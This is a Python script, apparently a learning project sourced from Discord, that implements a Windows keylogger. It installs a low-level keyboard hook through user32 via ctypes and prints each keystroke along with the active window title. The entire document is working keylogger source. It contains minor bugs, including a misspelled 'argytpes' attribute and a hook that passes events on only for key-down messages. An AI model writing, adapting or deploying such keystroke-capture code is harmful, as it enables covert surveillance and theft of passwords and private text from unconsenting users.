#Project #3 - Keylogging a System
# Hooks : point in the system message handling mechanism where app can install subroutine to monitor msg traffic
# in a system and process certain types of messages before they reach the target window procedure.
#source discord

from ctypes import *
from ctypes import wintypes
import logging
import os

logging.basicConfig(filename=(os.getcwd() +"\\" + 'logging.txt'), level=logging.DEBUG, format='%(message)s')

user32 = windll.user32
kernel32 = windll.kernel32

current_window = None   # Holds the current window title
last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed

LRESULT = c_long        # Type used in HOOKPROC

WH_KEYBOARD_LL = 13     # First Hook ID
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
WM_RETURN = 0x0D        # VM_RETURN message code
WM_SHIFT = 0x10         # VM_SHIFT message code
HC_ACTION = 0           # Parameter for KeyboardProc callback function

# An application-defined or library-defined callback function used with the SetWindowsHookEx function.
HOOKPROC = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)  # Callback function

# Retrieves the length, in characters, of the specified window's title bar text.
GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE,)
GetWindowTextLengthA.restype = wintypes.INT

# Copies text of specified window's title bar into buffer.
GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HANDLE, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

# Retrieves the status of the specified virtual key
GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT,)
GetKeyState.restype = wintypes.SHORT

# Copies the status of the 256 virtual keys to the specified buffer.
keyboard_state = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(keyboard_state),)
GetKeyboardState.restype = wintypes.BOOL

# Translates the specified virtual-key code and keyboard state to the corresponding character or characters.
ToAscii = user32.ToAscii
ToAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(keyboard_state), wintypes.LPWORD, wintypes.UINT)
ToAscii.restype = wintypes.INT

# Passes the hook information to the next hook procedure in the current hook chain.
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argytpes = (wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
CallNextHookEx.restype = LRESULT


# Installs an application-defined hook procedure into a hook chain.
SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (wintypes.INT, HOOKPROC, wintypes.HINSTANCE, wintypes.DWORD)
SetWindowsHookExA.restype = wintypes.HHOOK

# Retrieves a message from the calling thread's message queue.
GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL


class KBDLLHOOKSTRUCT(Structure):
    _fields_=[("vkCode",wintypes.DWORD),
              ("scanCode", wintypes.DWORD),
              ("flags", wintypes.DWORD),
              ("time", wintypes.DWORD),
              ("dwExtraInfo", wintypes.DWORD)]


def get_current_window():
    hwnd = user32.GetForegroundWindow()      # Get Handle of foreground window
    length = GetWindowTextLengthA(hwnd)      # Get length of window title bar
    buff = create_string_buffer(length + 1)  # Create buffer to store window title
    GetWindowTextA(hwnd, buff, length + 1)   # Get window title and store it in the buffer
    return buff.value                        # Return content of the buffer AKA the name


def hook_function(nCode, wParam, lParam):
    global last
    if last != get_current_window():
        last = get_current_window()
        print("\n[{}]".format(last.decode("latin-1")))

    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
        state = (wintypes.BYTE*256)()
        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))
        buf = (c_ushort * 1)()
        n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)
        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                print()
            else:
                print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True)
        return CallNextHookEx(hook, nCode, wParam, c_ulong(lParam))


last = None
ptr = HOOKPROC(hook_function)
hook = SetWindowsHookExA(WH_KEYBOARD_LL, ptr, 0, 0)
msg = wintypes.MSG()
print(type(msg))
GetMessageA(byref(msg), 0, 0, 0)

